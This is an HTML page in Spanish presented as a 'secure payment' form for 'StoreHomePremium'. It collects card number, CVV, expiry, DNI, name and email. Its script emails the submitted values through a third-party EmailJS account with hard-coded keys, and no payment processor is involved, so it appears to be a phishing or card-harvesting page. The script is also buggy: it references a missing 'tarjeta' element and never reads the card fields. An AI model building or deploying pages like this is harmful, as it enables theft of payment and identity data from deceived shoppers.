<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>StoreHomePremium - Pago Seguro</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <style>
    body {
      margin: 0;
      font-family: Arial, Helvetica, sans-serif;
      background: linear-gradient(180deg, #2f66d0, #6fa0ff);
      display: flex;
      justify-content: center;
      padding: 20px;
    }

    .card {
      width: 100%;
      max-width: 420px;
      color: white;
    }

    h1 {
      font-size: 30px;
      margin-bottom: 10px;
    }

    p {
      font-size: 14px;
      opacity: 0.9;
      margin-bottom: 20px;
    }

    label {
      display: block;
      font-size: 14px;
      margin-top: 15px;
      margin-bottom: 6px;
    }

    input {
      width: 100%;
      padding: 12px;
      border-radius: 8px;
      border: none;
      font-size: 14px;
      box-sizing: border-box;
    }

    .radio-group {
      display: flex;
      gap: 20px;
      margin-top: 10px;
    }

    .radio-group label {
      display: flex;
      align-items: center;
      gap: 6px;
      font-size: 14px;
    }

    button {
      width: 100%;
      padding: 14px;
      background-color: #0a2f7a;
      color: white;
      border: none;
      border-radius: 10px;
      font-size: 16px;
      font-weight: bold;
      margin-top: 25px;
      cursor: pointer;
    }

    button:hover {
      background-color: #08245f;
    }
  </style>
</head>

<body>

  <div class="card">
    <h1>StoreHomePremium – pago seguro y simple</h1>

    <p>
      Seleccione el monto a pagar y complete el formulario con sus datos.
      Recibirá una confirmación en su correo.
    </p>

    <label>Monto a pagar</label>
    <input id="monto" type="number" placeholder="$ Ingrese monto en pesos">

    <label>Tipo de tarjeta</label>
    <div class="radio-group">
      <label><input type="radio" name="tarjeta" value="Visa"> Visa</label>
      <label><input type="radio" name="tarjeta" value="Mastercard"> Mastercard</label>
    </div>

    <label>Nombre completo</label>
    <input id="nombre" type="text" placeholder="Ej: Juan Pérez">

    <label>Correo electrónico</label>
    <input id="email" type="email" placeholder="ejemplo@correo.com">

    <label>DNI</label>
    <input type="text" placeholder="Ingrese su DNI">

    <label>Número de tarjeta</label>
    <input type="text" placeholder="1234 5678 9012 3456">

    <label>Nombre del titular</label>
    <input type="text" placeholder="Nombre tal como aparece en la tarjeta">

    <label>Fecha de expiración (MM/AA)</label>
    <input type="text" placeholder="MM/AA">

    <label>Código de seguridad (CVV)</label>
    <input type="text" placeholder="123">

    <button id="enviar">Ver opciones de cuotas</button>
  </div>

  <!-- EmailJS -->
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>

  <script>
    emailjs.init("gOD19I3u7jPioagR4");

    document.getElementById("enviar").addEventListener("click", function (e) {
      e.preventDefault();

      const monto = document.getElementById("monto").value;
      const nombre = document.getElementById("nombre").value;
      const email = document.getElementById("email").value;
      const tarjeta = document.getElementById("tarjeta").value;

      emailjs.send("service_p965auj", "template_h5kc29e", {
        monto: monto,
        nombre: nombre,
        email: email,
        tarjeta: tarjeta
      })
      .then(function () {
        alert("Solicitud enviada correctamente");
      })
      .catch(function (error) {
        alert("Error al enviar la solicitud");
        console.log(error);
      });
    });
  </script>

</body>
</html>
